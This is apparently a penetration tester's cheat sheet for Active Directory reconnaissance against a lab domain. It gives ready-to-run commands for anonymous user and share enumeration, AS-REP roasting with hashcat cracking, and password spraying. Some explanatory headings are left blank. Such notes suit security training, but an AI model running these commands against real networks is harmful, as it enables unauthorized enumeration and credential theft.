# Reconnaissance

## Enumerate the network and DCs

List the domains available on the network.

```bash
cme smb <IP>/24
```

You will be able to see the **smb version.**

You will also be able to see if **smb signing** is enabled. By default, this is true for DC.&#x20;

Devices with **smb signing enable** might be your DCs.



### Find DC IP

Now that you find your domain, you can now locate the DCs

```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain_name> <IP>
```

Why does it work ?



## Enumerate DC's anonymously

### Enumerate users

#### CME again

```bash
cme smb <DC_IP> --users
```

You can also use the tool [`enum4linux`](https://github.com/CiscoCXSecurity/enum4linux)&#x20;



#### RPC

```bash
rpcclient -U "<DOMAIN_NAME>\\" <DC_IP> -N
rpcclient $> help
rpcclient $> enumdomusers
rpcclient $> enumdomgroupsbash
```

How ?





```bash
net rpc group members '<A_GROUP_NAME>' -W '<DOMAIN_NAME>' -I '<DC_IP>' -U '%'
```

How ?



#### NMAP

If you still want to enumerate anonymously (without an account) but can't create anonymous connections as before:

```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<REALM_NAME>',userdb=users.txt" <REALM_IP>
```

How ?

* When an **invalid username** is requested, the server will respond using the Kerberos error code `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN`.
* When a **valid username** is requested, the server answers with either a **TGT ticket** or a `KRB5KDC_ERR_PREAUTH_REQUIRED` signaling that the user is required to pre authenticate.





## Enumerate guest access on smb shares

```bash
enum4linux -a -u "" -p "" <DC_IP>
enum4linux -a -u "guest" -p "" <DC_IP>

smbmap -u "" -p "" -P 445 -H <DC_IP>
smbmap -u "guest" -p "" -P 445 -H <DC_IP>

smbclient -U '%' -L //<DC_IP>
smbclient -U 'guest%' -L //<DC_IP>

cme smb <IP> -u '' -p '' # enumerate null session
cme smb <IP> -u 'a' -p '' # enumerate anonymous session
cme smb <IP> -u 'a' -p '' --shares
```



## Enumerate passwords

### ASREP - roasting

```
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt
hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt

Rubeus asreproast /format:hashcat
hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
```

### Password Spray

```
cme smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower
```

